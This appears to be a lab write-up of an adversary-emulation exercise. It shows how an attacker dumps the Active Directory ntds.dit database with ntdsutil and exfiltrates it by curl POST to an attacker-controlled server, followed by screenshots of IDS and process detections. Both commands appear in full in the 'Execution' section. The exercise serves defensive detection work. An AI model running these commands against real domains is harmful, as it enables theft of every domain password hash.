## Adversarial Emulation & Detection Phase 6 : Data Exfiltration
Following successful Domain Controller compromise, this phase simulates an adversary collecting and exfiltrating Active Directory database files from the environment (Collection:T1005 – Data from Local System).
In an Active Directory ecosystem, ntds.dit file contains all domain usernames, group associations, and password hashes, An attacker cannot copy C:\Windows\NTDS\ntdsutil.dit directly because the Active Directory process locks it permanently. The workaround is taking a snapshot via the Volume Shadow Copy service or using ntdsutil.exe.
## Execution:
First a snapshot was created using ntdsutil.exe, then data was exfilterated to a web server the attacker controls
```
ntdsutil "ac i ntds" "ifm" "create full C:\Exfil_Drop" q q
curl -X POST -H "Content-Type: application/octet-stream" --data-binary @"C:\Exfil_Drop\Active Directory\ntds.dit" http://192.168.100.30:8000/upload
```

<img width="1562" height="617" alt="exfil-execution" src="https://github.com/user-attachments/assets/06511209-45d2-40ae-a537-05218bd50742" />

## Detection:

Looking for IDS alerts, we can see network connections to the attacker using curl:

<img width="1515" height="657" alt="exfil-suricata" src="https://github.com/user-attachments/assets/22c16970-469f-42b8-9838-14f6f864e0e5" />

Looking for exfilteration using curl:

<img width="1487" height="450" alt="curl-detection" src="https://github.com/user-attachments/assets/90652e11-4616-42a6-8079-336a536c2639" />

Looking for processes ran using ntdsutil:

<img width="1506" height="512" alt="ntds-detection" src="https://github.com/user-attachments/assets/c9a841fa-f1cd-4ec2-b243-8d3b1c1d7f07" />


